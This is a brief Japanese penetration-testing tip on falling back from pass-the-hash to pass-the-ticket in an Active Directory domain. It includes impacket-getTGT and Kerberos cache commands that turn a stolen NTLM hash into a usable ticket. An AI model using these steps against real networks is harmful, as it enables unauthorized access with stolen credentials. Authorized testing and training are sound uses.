# Pass The Hashがいけそうなのにいけない場合はPass The Ticketを狙うべし

Kerberosチケットでの認証は許可されていて、NTLMでの認証は許可されていないかも。

**impacket-getTGT** でハッシュからTGTを作成。

```
impacket-getTGT -hashes <NTLM hash> -dc-ip <IP> <domain>/<username>
```

その後、チケットがつくれてuser.ccacheに保存されたら、以下のようにチケットを登録する：

```
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
```

チケットができたら、今までpass the hashでやっていたimpacketを、このチケットをつかって行えばよい（オプション **-no-pass -k**）。
